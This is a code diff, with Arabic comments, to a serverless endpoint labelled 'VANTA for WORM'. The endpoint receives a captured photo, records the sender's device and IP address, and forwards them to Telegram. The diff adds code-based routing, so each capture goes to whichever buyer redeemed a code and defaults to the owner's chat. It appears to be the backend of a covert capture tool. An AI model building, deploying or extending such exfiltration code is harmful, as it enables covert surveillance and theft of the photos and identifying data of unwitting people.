@@ -1,3 +1,6 @@
+// api/send.js — VANTA for WORM
+// يستقبل الصورة، يتحقق من الرمز، يرسلها لصاحب الرمز
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     res.status(405).json({ ok: false });
@@ -5,10 +8,11 @@ export default async function handler(req, res) {
   }
 
   const TG_TOKEN = process.env.TG_TOKEN;
-  const TG_CHAT  = process.env.TG_CHAT;
+  const CONFIG_URL = process.env.GLOBAL_CONFIG;
+  const FALLBACK_CHAT = process.env.TG_CHAT;
 
-  if (!TG_TOKEN || !TG_CHAT) {
-    res.status(500).json({ ok: false, err: 'missing env' });
+  if (!TG_TOKEN) {
+    res.status(500).json({ ok: false, err: 'no token' });
     return;
   }
 
@@ -18,6 +22,7 @@ export default async function handler(req, res) {
 
     const image  = body && body.image;
     const device = (body && body.device) ? String(body.device).slice(0, 200) : 'غير معروف';
+    const code   = (body && body.code) ? String(body.code).toUpperCase().replace(/[^A-Z0-9]/g,'') : '';
 
     const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
     if (!m) {
@@ -30,13 +35,40 @@ export default async function handler(req, res) {
                 || req.socket?.remoteAddress || 'unknown';
     const cap = new Date().toISOString();
 
+    // تحديد المستلم
+    let recipient = null;
+
+    if (code && CONFIG_URL) {
+      try {
+        const r = await fetch(CONFIG_URL);
+        const cfg = await r.json();
+        const codes = cfg.codes || {};
+        const entry = codes[code];
+        if (entry && entry.usedBy) {
+          recipient = entry.usedBy;
+        }
+      } catch (e) {}
+    }
+
+    // إذا لا يوجد رمز صحيح، أرسل للمالك (fallback)
+    if (!recipient) {
+      recipient = FALLBACK_CHAT;
+    }
+
+    if (!recipient) {
+      res.status(400).json({ ok: false, err: 'no recipient' });
+      return;
+    }
+
     const caption =
+      '📸 صورة جديدة\n' +
+      (code ? '🔑 الرمز: ' + code + '\n' : '') +
       '📱 ' + device + '\n' +
       '🌐 IP: ' + ip + '\n' +
       '🕐 ' + cap;
 
     const boundary = '----vanta' + Date.now();
-    const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT}\r\n` +
+    const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${recipient}\r\n` +
                  `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
                  `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cap.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
     const tail = `\r\n--${boundary}--\r\n`;
